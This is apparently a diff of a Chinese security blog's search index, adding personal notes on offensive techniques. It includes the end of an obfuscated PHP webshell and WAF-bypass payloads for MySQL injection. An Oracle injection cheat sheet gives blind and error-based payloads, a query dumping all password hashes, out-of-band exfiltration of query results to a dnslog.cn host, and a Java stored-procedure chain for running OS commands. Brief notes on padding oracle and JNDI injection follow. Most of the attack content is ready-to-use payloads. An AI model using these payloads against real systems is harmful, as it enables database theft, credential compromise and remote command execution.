class="number">0</span>D<span class="string">'^'</span>]<span class="string">').('</span>%<span class="number">2</span>F<span class="string">'^'</span>`<span class="string">').('</span>%<span class="number">0</span>E<span class="string">'^'</span>]<span class="string">').('</span>%<span class="number">09</span><span class="string">'^'</span>]<span class="string">'); // $__='</span>_POST<span class="string">';</span></span><br><span class="line"><span class="string">$___=$$__;</span></span><br><span class="line"><span class="string">$_($___[pwd]); // assert($_POST[_]);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="过安全狗waf思路："><a href="#过安全狗waf思路：" class="headerlink" title="过安全狗waf思路："></a>过安全狗waf思路：</h3><p>师傅们，请教下关于mysql 注入bypass的问题。<br>目标为授权站点，需要拉数据，且数据量多。盲注好慢！！！<br>环境： linux Apache-Coyote mysql</p>
+<p>看界面样式是安全狗，但html里面无safedog字样，应该是安全狗！<br>post注入点：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;aaaaaa&amp;post&#x3D;1 &#39;        报错</span><br><span class="line">a&#x3D;aaaaaa&amp;post&#x3D;1 &#39;  order by 1 --+-正常  </span><br><span class="line">a&#x3D;aaaaaa&amp;post&#x3D;1 &#39;  order by 2 --+-报错 </span><br><span class="line">a&#x3D;aaaaaa&amp;post&#x3D;1&#39; || char_length(version())&gt;4  --+-常规盲注， ture空白，false api接口有返回信息</span><br></pre></td></tr></table></figure>
+
+<p>已通过盲注获取到了基本信息</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数据库版本        8.0.22</span><br><span class="line">当前用户        *******（非root）@192.168.1.2</span><br></pre></td></tr></table></figure>
+
+<p>waf过滤了 一些关键词和 关键词组合</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、过滤了select 和from组合以及union select组合，以上组合，只要两个关键词同时出现，就会触发waf，如，如aasElecTbbgdffromgdgdf 就会触发waf，已fuzz各种空白字符组合（%0a %00.。。。。。。）</span><br><span class="line">2、过滤了updatexml floor extractvalue 三个报错函数(不带括号)，只要出现关键字就会触发waf，如aaaaupdatexmlfgfdgfd</span><br></pre></td></tr></table></figure>
+
+<p>绕过尝试：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、post转multipart&#x2F;form-data 也会触发waf，已经放弃</span><br><span class="line">2、各种空白字符组合 如换行 回车什么的，内联注释同样放弃</span><br><span class="line">3、一次、二次url编码  会触发waf </span><br><span class="line">4、如post内容为空，get也会接受参数，但是waf同样会识别。</span><br><span class="line">5、a&#x3D;1&amp;updatexml这种不会触发waf，尝试post  a&#x3D;aaaaaa&amp;post&#x3D;1&#39; || &#x2F;*&amp;*&#x2F;updatexml  以及 a&#x3D;aaaaaa&amp;post&#x3D;1&#39; || &#x2F;*&amp;*&#x2F;char_length(version())&gt;4 ，发现会把&amp;之后的内容当第二个参数，带入不到sql</span><br><span class="line">6、分段传输400</span><br><span class="line">7、最近有遇到一个数字型注入存在安全狗，我是这么绕过的?id&#x3D;1 &#x2F;*&amp;id &#x3D;-1 union select 1,2,3,4%23*&#x2F;测试的时候，发现&#x2F;*&amp; *&#x2F;这里面，不管输入什么关键字，都不会拦截，后面的%23是注释掉后面的*&#x2F;，你可以试试（我在测试的时候，单独的union和单独的select这种，那个站的安全狗是不拦的，组合在一起才会拦截，不知道你是不是这种情况）              但是&amp;后面要是匹配到&#x3D;号 也会拦截！  </span><br><span class="line">8、 换行+空格</span><br><span class="line">9、 mysql的内联注释</span><br><span class="line">10、 分块传输绕</span><br></pre></td></tr></table></figure>
+
+]]></content>
   </entry>
   <entry>
     <title>java/java逆向/1</title>
     <url>/2021/07/19/java/java%E9%80%86%E5%90%91/1/</url>
     <content><![CDATA[<h3 id="java恶意软件分析原理"><a href="#java恶意软件分析原理" class="headerlink" title="java恶意软件分析原理"></a>java恶意软件分析原理</h3><p>1、将函数名重名名</p>
-<p><img src="/2021/07/19/java/java%E9%80%86%E5%90%91/1/blog/source/_posts/java/java%E9%80%86%E5%90%91/image-20210719113510018.png" alt="image-20210719113510018"></p>
+<p><img src="/2021/07/19/java/java%E9%80%86%E5%90%91/1/image-20210719113510018.png" alt="image-20210719113510018"></p>
 <p>只是返回一个数字，并没有任何实际的意义，当作了不必要的指令。</p>
 <p>2、和将字符串变量</p>
-<p><img src="/2021/07/19/java/java%E9%80%86%E5%90%91/1/blog/source/_posts/java/java%E9%80%86%E5%90%91/image-20210719113020969.png" alt="image-20210719113020969"></p>
+<p><img src="/2021/07/19/java/java%E9%80%86%E5%90%91/1/image-20210719113020969.png" alt="image-20210719113020969"></p>
 <p>每个组件通过一个函数将其转换回串联的字符串。（文件夹路径+双反斜杠+aes解密）</p>
 ]]></content>
   </entry>
@@ -4419,14 +4357,14 @@
 <p>其实都是spring的配置没导入，因为新建了shiro的项目，需要再导入spring的配置，那么一个个问题我细化了来解决，虽然直接从头将配置文件配好就没有这么多导入的问题了。</p>
 <p>1、IDEA中创建Controller类出现can’t reslove symbol servlet问题</p>
 <p>spring的依赖没有添加。在pom文件中到入springframework。都不知道自己导入过这么多个版本了。。</p>
-<p><img src="/2021/06/30/java/shiro%E9%85%8D%E5%90%88spring/1/blog/source/_posts/java/shiro%E9%85%8D%E5%90%88spring/image-20210630164536039.png" alt="image-20210630164536039"></p>
+<p><img src="/2021/06/30/java/shiro%E9%85%8D%E5%90%88spring/1/image-20210630164536039.png" alt="image-20210630164536039"></p>
 <p>2、idea项目文件夹是白的。新建不了java类</p>
 <p>将该文件夹改成这个就好了。</p>
-<p><img src="/2021/06/30/java/shiro%E9%85%8D%E5%90%88spring/1/blog/source/_posts/java/shiro%E9%85%8D%E5%90%88spring/image-20210630164703110.png" alt="image-20210630164703110"></p>
+<p><img src="/2021/06/30/java/shiro%E9%85%8D%E5%90%88spring/1/image-20210630164703110.png" alt="image-20210630164703110"></p>
 <p>3、classpath文件找不到</p>
-<p><img src="/2021/06/30/java/shiro%E9%85%8D%E5%90%88spring/1/blog/source/_posts/java/shiro%E9%85%8D%E5%90%88spring/image-20210630164850596.png" alt="image-20210630164850596"></p>
+<p><img src="/2021/06/30/java/shiro%E9%85%8D%E5%90%88spring/1/image-20210630164850596.png" alt="image-20210630164850596"></p>
 <p>同样也是上面的那个问题 ，不过可以在这里配置</p>
-<p><img src="/2021/06/30/java/shiro%E9%85%8D%E5%90%88spring/1/blog/source/_posts/java/shiro%E9%85%8D%E5%90%88spring/image-20210630164948137.png" alt="image-20210630164948137"></p>
+<p><img src="/2021/06/30/java/shiro%E9%85%8D%E5%90%88spring/1/image-20210630164948137.png" alt="image-20210630164948137"></p>
 <ol>
 <li>在idea项目中只有被标记为<code>Resource Folders</code>的文件夹下的文件才会被添加至target-&gt;classes。</li>
 <li>Tomcat下的Web应用有两个预置的classpath :<ol>
@@ -4436,7 +4374,7 @@
 </li>
 </ol>
 <p>4、 Target JRE version (1.8.0_221) does not match project JDK version (java version “1.8.0_102”), will use sources from JDK: 1.8</p>
-<p><img src="/2021/06/30/java/shiro%E9%85%8D%E5%90%88spring/1/blog/source/_posts/java/shiro%E9%85%8D%E5%90%88spring/image-20210630172821872.png" alt="image-20210630172821872"></p>
+<p><img src="/2021/06/30/java/shiro%E9%85%8D%E5%90%88spring/1/image-20210630172821872.png" alt="image-20210630172821872"></p>
 <p>tomcat的版本也需要配置</p>
 ]]></content>
   </entry>
@@ -4444,21 +4382,21 @@
     <title>java/java命令执行底层/1</title>
     <url>/2021/06/07/java/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82/1/</url>
     <content><![CDATA[<p>跟到<code>ProcessImpl#&lt;init&gt;构造方法</code>中，进入<code>needsEscaping</code>方法</p>
-<p><img src="/2021/06/07/java/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82/1/blog/source/_posts/java/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82/image-20210607194551947.png" alt="image-20210607194551947"></p>
+<p><img src="/2021/06/07/java/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82/1/image-20210607194551947.png" alt="image-20210607194551947"></p>
 <p>判断cmd有没有加引号，如果没加引号，根据前面传入的常量verificationType为2，cmd.exe里面存在空格或者制表符就会返回true这个变量传入，到上面那张图的为路径加上引号。</p>
-<p><img src="/2021/06/07/java/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82/1/blog/source/_posts/java/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82/image-20210607194720156.png" alt="image-20210607194720156"></p>
+<p><img src="/2021/06/07/java/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82/1/image-20210607194720156.png" alt="image-20210607194720156"></p>
 <p>进入第一张图的最后一行createCommandLine方法，cmdbuf新建一个80容量的StringBuilder，并将cmd的路径放在字符串的第一位。后面继续对参数做校验是否需要escape。参数也是2传入，对空格和制表符会进行一个加引号的处理。（疑点：之前不是对字符串的分隔符空格做参数的分离了，为什么这里还要对空格进行判断来加双引号）。最后这个方法返回cmdbuf.toString()</p>
-<p><img src="/2021/06/07/java/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82/1/blog/source/_posts/java/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82/image-20210607195954256.png" alt="image-20210607195954256"></p>
+<p><img src="/2021/06/07/java/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82/1/image-20210607195954256.png" alt="image-20210607195954256"></p>
 <p>最后进入create函数，返回pid传入Long handle，弹出计算机。</p>
-<p><img src="/2021/06/07/java/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82/1/blog/source/_posts/java/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82/image-20210607200828734.png" alt="image-20210607200828734"></p>
-<p><img src="/2021/06/07/java/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82/1/blog/source/_posts/java/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82/image-20210607200850708.png" alt="image-20210607200850708"></p>
+<p><img src="/2021/06/07/java/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82/1/image-20210607200828734.png" alt="image-20210607200828734"></p>
+<p><img src="/2021/06/07/java/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82/1/image-20210607200850708.png" alt="image-20210607200850708"></p>
 <p>其实是对于cmd.exe传参的问题，如果新起一个进程要执行cmd.exe 将参数传入需要加入引号。底层仅对空格和制表符加上双引号，而空格的问题在StringTokenizer这个类中就将空格的问题解决了。也就是说会在制表符的地方加上双引号。（我后面测试了一下制表符在StringTokenizer类中就直接吃掉了。。）</p>
 <p>于是我往回看：发现在传入exec函数的时候就被过滤了；再往回走</p>
-<p><img src="/2021/06/07/java/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82/1/blog/source/_posts/java/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82/image-20210610092752056.png" alt="image-20210610092752056"></p>
+<p><img src="/2021/06/07/java/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82/1/image-20210610092752056.png" alt="image-20210610092752056"></p>
 <p>StringTokenizer的hasMoreTokens()进入</p>
-<p><img src="/2021/06/07/java/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82/1/blog/source/_posts/java/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82/image-20210610092846838.png" alt="image-20210610092846838"></p>
+<p><img src="/2021/06/07/java/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82/1/image-20210610092846838.png" alt="image-20210610092846838"></p>
 <p>发现在这个skipDelimiters就把<code>\t\n\r\f</code> （\r回车移到行前，\n移到下一行，\t跳到下一个TAB位置,\f换页(FF)，将当前位置移到下页开头）字符串给过滤了。</p>
-<p><img src="/2021/06/07/java/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82/1/blog/source/_posts/java/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82/image-20210610092735714.png" alt="image-20210610092735714"></p>
+<p><img src="/2021/06/07/java/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82/1/image-20210610092735714.png" alt="image-20210610092735714"></p>
 ]]></content>
   </entry>
   <entry>
@@ -4601,6 +4539,676 @@
 
 
 
+]]></content>
+  </entry>
+  <entry>
+    <title>Oracle注入技巧/1</title>
+    <url>/2021/09/16/Oracle%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/1/</url>
+    <content><![CDATA[<p><a href="https://y4er.com/post/oracle-sql-inject/" target="_blank" rel="noopener">https://y4er.com/post/oracle-sql-inject/</a></p>
+<h3 id="一、oracle的绕过"><a href="#一、oracle的绕过" class="headerlink" title="一、oracle的绕过"></a>一、oracle的绕过</h3><p>1、 <code>&#39;%7c%7c(case+when+instr(user,&#39;S&#39;,2)&gt;0+%0a/**/then+&#39;lyx&#39;+else+&#39;0&#39;+end)%7c%7c&#39;
+用%0a或者%0d与/**/注释符的组合来绕过。</code></p>
+<p>引发的思考：<br>1、fuzz函数<br>    可以在/<em><em>/里面fuzz函数黑名单的匹配检索。比如我在/</em>substr</em>/就会报错</p>
+<p><img src="/2021/09/16/Oracle%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/1/blog/source/_posts/Oracle%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/image-20210916163729399.png" alt="image-20210916163729399"></p>
+<p>md这玩意儿 不行啊</p>
+<p><img src="/2021/09/16/Oracle%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/1/blog/source/_posts/Oracle%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/image-20210916172718527.png" alt="image-20210916172718527"></p>
+<p>2、 如何查询user字段的内容<br>    这里就需要对字串的操作，找了以下几个方法，有待补充：1、substr,substring 2、like 3、instr4、replace</p>
+<pre><code>1、substr( string, start_position, [ length ] ) 返回的是字串
+例子： substr(&apos;This is a test&apos;, 6, 2)     would return &apos;is&apos;</code></pre><p>​<br>    2、 like<br>    when+user+like’H%25’+%0<br>    对这个H进行fuzz占位</p>
+<pre><code>3、instr的用法 会涉及脚本跑出，参数替换（这个的效率是比like要好的）
+语法：instr(sourceString,destString,start,appearPosition).   instr（&apos;源字符串&apos; , &apos;目标字符串&apos; ,&apos;开始位置&apos;,&apos;第几次出现&apos;）
+比如用户名为HSCON
+    1、
+instr(user,&apos;H&apos;,1)=1
+instr(user,&apos;S&apos;,2)=2
+
+    2、
+instr(user,&apos;HS&apos;,1)=1
+instr(user,&apos;HSC&apos;,1)=1
+
+4、replace
+replace（&apos;将要更改的字符串&apos;,&apos;被替换掉的字符串&apos;,&apos;替换字符串&apos;）
+例：select  replace (&apos;111222333444&apos;,&apos;222&apos;,&apos;888&apos;) from dual;
+输出为 &apos;111888333444&apos; 所以正确执行就返回1</code></pre><p>3、 获取数据库的更多信息</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数据表user_tables里获取数据列table_name的信息:</span><br><span class="line">select wm_concat(table_name) from user_tables</span><br><span class="line">(select wm_concat(table_name ) from user_tables where rownum&#x3D;1 and table_name not in(&#39;USERS&#39;))</span><br><span class="line"></span><br><span class="line">从数据表user_tab_columns里获取数据列column_name的信息:</span><br><span class="line">select wm_concat(column_name) from user_tab_columns where table_name&#x3D; &#39;USERS&#39;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取数据库版本：</span><br><span class="line">SELECT banner FROM v$version WHERE banner LIKE &#39;Oracle%&#39;;</span><br><span class="line">SELECT version FROM v$instance;</span><br><span class="line"></span><br><span class="line">获取操作系统版本：</span><br><span class="line">SELECT banner FROM v$version where banner like &#39;TNS%&#39;;</span><br><span class="line"></span><br><span class="line">获取当前数据库用户:</span><br><span class="line">SELECT user FROM dual;</span><br><span class="line"></span><br><span class="line">获取当前用户权限:</span><br><span class="line">SELECT * FROM session_privs;</span><br><span class="line"></span><br><span class="line">获取所有数据库用户密码:</span><br><span class="line">SELECT name, spare4 FROM sys.user$;</span><br><span class="line"></span><br><span class="line">获取users表的用户名和密码：</span><br><span class="line">select wm_concat(username||&#39;~&#39;||password) from USERS</span><br><span class="line"></span><br><span class="line">列出DBA账户:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">获取DB文件路径:</span><br><span class="line">SELECT name FROM V$DATAFILE;</span><br></pre></td></tr></table></figure>
+
+<h3 id="二、盲注的种类"><a href="#二、盲注的种类" class="headerlink" title="二、盲注的种类"></a>二、盲注的种类</h3><p>时间盲注</p>
+<p>语句一正确延时10秒左右返回1:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 1 from dual where DBMS_PIPE.RECEIVE_MESSAGE(&#39;olo&#39;, REPLACE((SELECT substr(user, 1, 1) FROM dual), &#39;S&#39;, 10))&#x3D;1;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBRAAlzkiciaal2kLSIGYhCS6lPOicl654HktXU5ULZMazXAibLDamIeZHZfZczurTzn6way8ABCSqW98Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<p>语句二正确延时10s左右返回1:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select decode(substr(user,1,1),&#39;S&#39;,dbms_pipe.receive_message(&#39;olo&#39;,10),0) from dual;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>语句三正确延时10s左右返回1:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 1 from dual where 1&#x3D;0 or DBMS_PIPE.RECEIVE_MESSAGE(&#39;pyy&#39;, REPLACE((SELECT substr(user, 1, 1) FROM dual), &#39;S&#39;, 10))&#x3D;1;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><strong>报错注入:</strong></p>
+<p>ctxsys.drithsx.sn()函数:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select ctxsys.drithsx.sn(1, (select user from dual)) from dual;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>ctxsys.ctx_report.token_type()函数:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select ctxsys.ctx_report.token_type((select user from dual), &#39;1&#39;) from dual;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>xmltype()函数:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select xmltype(&#39;&lt;:&#39;||(select user from dual)||&#39;&gt;&#39;) from dual;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>dbms_xdb_version.checkin()函数:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select dbms_xdb_version.checkin((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>dbms_xdb_version.makeversioned()函数:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select dbms_xdb_version.makeversioned((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>dbms_xdb_version.uncheckout()函数:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select dbms_xdb_version.uncheckout((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>dbms_utility.sqlid_to_sqlhash()函数:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>ordsys.ord_dicom.getmappingxpath()函数:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select ordsys.ord_dicom.getmappingxpath((select user from dual), 1, 1) from dual;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>utl_inaddr.get_host_name()函数:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select utl_inaddr.get_host_name((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>utl_inaddr.get_host_address()函数:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select utl_inaddr.get_host_address(&#39;~&#39;||(select user from dual)||&#39;~&#39;) from dual;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>带外通道(OOB：Out Of Band Channels):</p>
+<p>  使用一些除常规通道以外的替代的信道来请求服务器资源，一般使用 Oracle 发送HTTP或者DNS请求，将查询结果带到请求中，然后监测外网服务器的HTTP和DNS日志，从日志中获取 sql 语句查询的结果，通过这种方式将繁琐的盲注转换成可以直接简便的获取查询结果的方式，尤其是基于时间的盲注，能极大地加快速度</p>
+<p>utl_http.request()函数:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT UTL_HTTP.REQUEST((select user from dual)||&#39;.xxxxx.dnslog.cn&#39;) FROM DUAL;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>utl_inaddr.get_host_address()函数:(重新打马赛克)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select utl_inaddr.get_host_address((select user from dual)||&#39;.xxxxxx.dnslog.cn&#39;) from dual;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p>sys.dbms_ldap.init()函数:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select dbms_ldap.init(&#39;xxxxxx.dnslog.cn&#39;,80) from dual;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>httpuritype()函数:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select httpuritype((select user from dual)||&#39;.xxxxxx.dnslog.cn&#39;).getclob() from dual;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>执行系统命令:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select null,null from dual union select 1,dbms_xmlquery.newcontext(&#39;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#39;&#39;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args) &#123;try&#123;BufferedReader myReader&#x3D; new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str&#x3D;&quot;&quot;;while ((stemp &#x3D; myReader.readLine()) !&#x3D; null) str +&#x3D;stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&#39;&#39;;commit;end;&#39;) from dual;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select dbms_xmlquery.newcontext(&#39;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#39;&#39;begin dbms_java.grant_permission( &#39;&#39;&#39;&#39;SYSTEM&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;SYS:java.io.FilePermission&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&lt;&lt;ALL FILES&gt;&gt;&#39;&#39;&#39;&#39;,&#39;&#39;&#39;&#39;EXECUTE&#39;&#39;&#39;&#39;);end;&#39;&#39;commit;end;&#39;) from dual;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select dbms_xmlquery.newcontext(&#39;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#39;&#39;create or replace function osshell(p_cmd in varchar2) return varchar2 as language java name &#39;&#39;&#39;&#39;LinxUtil.runCMD(java.lang.String) return String&#39;&#39;&#39;&#39;; &#39;&#39;;commit;end;&#39;) from dual;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>执行系统命令:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select osshell(&#39;whoami&#39;) from dual;</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+  </entry>
+  <entry>
+    <title>杂问题/1</title>
+    <url>/2021/09/22/%E6%9D%82%E9%97%AE%E9%A2%98/1/</url>
+    <content><![CDATA[<h3 id="1、-oracle-padding-attack"><a href="#1、-oracle-padding-attack" class="headerlink" title="1、 oracle padding attack"></a>1、 oracle padding attack</h3><p>和盲注一样，这种二值逻辑的推理关键是要找到一个”区分点”，即能被攻击者用来区分这个的输入是否达到了目的(在这里就是寻找正确的IV)。</p>
+<p>比如在web应用中，如果Padding不正确，则应用程序很可能会返回500的错误(程序执行错误)；如果Padding正确，但解密出来的内容不正确，则可能会返回200的自定义错误(这只是业务上的规定)，所以，这种区别就可以成为一个二值逻辑的”注入点”。</p>
+<p>解密是可以并行的 只需要经过解密function 再和上一字段进行异或。</p>
+<p>1、先从0x01开始，Decrypted Value的最后一个字节为0x01时才能成功。从而确定了intermediary为3d然后继续fuzz。</p>
+<p><img src="/2021/09/22/%E6%9D%82%E9%97%AE%E9%A2%98/1/1.png" alt="在这里插入图片描述"></p>
+<p>2、再从0x02开始，只需要遍历第七个 因为第八个的值是0x02异或0x0d=0x3F</p>
+<p><img src="/2021/09/22/%E6%9D%82%E9%97%AE%E9%A2%98/1/2.png" alt="在这里插入图片描述"></p>
+<p><img src="/2021/09/22/%E6%9D%82%E9%97%AE%E9%A2%98/1/blog/source/_posts/%E6%9D%82%E9%97%AE%E9%A2%98/2c59316451b623652d232d178b31711c.png-quanzi" alt="file"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>java/绕过高版本的ldap+rmi/1</title>
+    <url>/2021/08/24/java/%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84ldap+rmi/1/</url>
+    <content><![CDATA[<h1 id="绕过高版本jdk限制进行jndi注入利用"><a href="#绕过高版本jdk限制进行jndi注入利用" class="headerlink" title="绕过高版本jdk限制进行jndi注入利用"></a>绕过高版本jdk限制进行jndi注入利用</h1><h2 id="JDK-6u141-JDK-7u131-JDK-8u121-之前"><a href="#JDK-6u141-JDK-7u131-JDK-8u121-之前" class="headerlink" title="JDK 6u141, JDK 7u131, JDK 8u121 之前"></a>JDK 6u141, JDK 7u131, JDK 8u121 之前</h2><h3 id="0x01-关于JNDI-Naming-Reference的限制"><a href="#0x01-关于JNDI-Naming-Reference的限制" class="headerlink" title="0x01 关于JNDI Naming Reference的限制"></a>0x01 关于JNDI Naming Reference的限制</h3><p>JDK 7u21开始，java.rmi.server.useCodebaseOnly 默认值就为true，防止RMI客户端VM从其他Codebase地址上动态加载类。然而JNDI注入中的Reference Payload并不受useCodebaseOnly影响，因为它没有用到 RMI Class loading，它最终是通过URLClassLoader加载的远程类。</p>
+<p>NamingManager.java（1.8.221）</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ObjectFactory <span class="title">getObjectFactoryFromReference</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    Reference ref, String factoryName)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IllegalAccessException,</span></span><br><span class="line"><span class="function">    InstantiationException,</span></span><br><span class="line"><span class="function">    MalformedURLException </span>&#123;</span><br><span class="line">    Class&lt;?&gt; clas = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Try to use current class loader</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">         clas = helper.loadClass(factoryName);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="comment">// ignore and continue</span></span><br><span class="line">        <span class="comment">// e.printStackTrace();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// All other exceptions are passed up.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Not in class path; try to use codebase</span></span><br><span class="line">    String codebase;</span><br><span class="line">    <span class="keyword">if</span> (clas == <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">            (codebase = ref.getFactoryClassLocation()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clas = helper.loadClass(factoryName, codebase);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (clas != <span class="keyword">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码中会先尝试在本地CLASSPATH中加载类<code>clas = helper.loadClass(factoryName);</code>不行再从Codebase中加载<code>clas = helper.loadClass(factoryName, codebase);</code>Codebase的值是通过ref.getFactoryClassLocation()获得。</p>
+<p>1、我们先进从本地获取的方法，这里的helper是VersionHelper12类，跟进getContextClassLoader方法，最后是通过<code>Thread.currentThread().getContextClassLoader</code>方法返回loader对象<code>Launcher$AppClassLoader</code>这个静态内部类是继承URLClassloader的。</p>
